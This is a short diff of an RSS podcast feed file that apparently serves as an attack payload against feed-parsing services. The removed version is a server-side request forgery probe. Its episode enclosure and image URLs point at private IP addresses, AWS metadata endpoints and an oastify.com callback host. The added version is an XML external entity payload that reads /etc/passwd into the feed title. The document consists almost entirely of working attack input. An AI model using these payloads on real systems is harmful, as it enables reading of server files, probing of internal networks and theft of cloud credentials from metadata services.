@@ -1,40 +1,10 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<rss version="2.0">
   <channel>
-    <title>Test Podcast</title>
-    <link>https://1uwbueapphxvvitjlewqi7dtskybm1aq.oastify.com/link</link>
-    <description>Combined Test Podcast Feed</description>
-    <language>en-us</language>
-
-    <item>
-      <title>Episode 1 - Local IP</title>
-      <enclosure url="http://192.168.1.176:3128/" length="1024" type="audio/mpeg"/>
-      <itunes:image href="http://192.168.1.176:3128/"/>
-    </item>
-
-    <item>
-      <title>Episode 2 - Network IP</title>
-      <enclosure url="http://172.19.254.125/" length="1024" type="audio/mpeg"/>
-      <itunes:image href="http://172.19.254.125/"/>
-    </item>
-
-    <item>
-      <title>Episode 3 - IPv6 Meta-data</title>
-      <enclosure url="http://[fd00:ec2::254]/latest/meta-data/" length="1024" type="audio/mpeg"/>
-      <itunes:image href="http://[fd00:ec2::254]/latest/meta-data/"/>
-    </item>
-
-    <item>
-      <title>Episode 4 - AWS/Cloud Meta-data</title>
-      <enclosure url="http://169.254.169.254/latest/meta-data/" length="1024" type="audio/mpeg"/>
-      <itunes:image href="http://169.254.169.254/latest/meta-data/"/>
-    </item>
-
-    <item>
-      <title>Episode 5 - Oastify Link</title>
-      <enclosure url="https://1uwbueapphxvvitjlewqi7dtskybm1aq.oastify.com/enclosure.mp3" length="1024" type="audio/mpeg"/>
-      <itunes:image href="https://1uwbueapphxvvitjlewqi7dtskybm1aq.oastify.com/image.jpg"/>
-    </item>
-
+    <title>&xxe;</title>
+    <description>test</description>
   </channel>
 </rss>
